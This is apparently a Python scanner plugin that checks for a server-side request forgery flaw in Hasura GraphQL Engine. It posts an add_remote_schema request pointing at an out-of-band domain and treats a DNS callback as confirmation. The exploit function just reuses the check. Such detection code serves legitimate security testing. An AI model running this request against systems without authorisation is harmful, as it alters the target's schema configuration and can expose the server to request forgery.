import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hasura GraphQL Engine - SSRF Side Request Forgery''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://cxsecurity.com/issue/WLB-2021040115"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hasura", "ssrf", "graphql"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/v1/query"""
        method = "POST"
        data = {
            "type":"bulk",
            "args":[
                {
                    "type":"add_remote_schema",
                    "args":{
                        "name":"test",
                        "definition":{
                        "url":"https://{oob_domain}".format(oob_domain=oob_domain),
                        "headers":[
                        ],
                        "timeout_seconds":60,
                        "forward_client_headers":True
                        }
                    }
                }
            ]
        }
        headers = {'Content-Type': 'application/json', 'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url